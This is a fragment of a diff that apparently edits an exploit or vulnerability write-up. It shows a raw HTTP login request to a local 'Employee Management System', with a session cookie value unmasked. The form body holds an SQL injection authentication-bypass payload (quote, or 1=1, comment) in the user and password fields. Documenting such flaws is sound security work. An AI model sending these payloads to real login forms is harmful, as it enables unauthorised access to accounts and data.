@@ -83,7 +83,7 @@ Content-Type: application/x-www-form-urlencoded
 Origin: http://localhost:8081
 Connection: close
 Referer: http://localhost:8081/Employee%20Management%20System/alogin.html
-Cookie: PHPSESSID=i************************v
+Cookie: PHPSESSID=infdfigld4et4jndfgbn33kcsv
 Upgrade-Insecure-Requests: 1
 
 mailuid=anki%27+or+1%3D1%23&pwd=anki%27+or+1%3D1%23&login-submit=Login
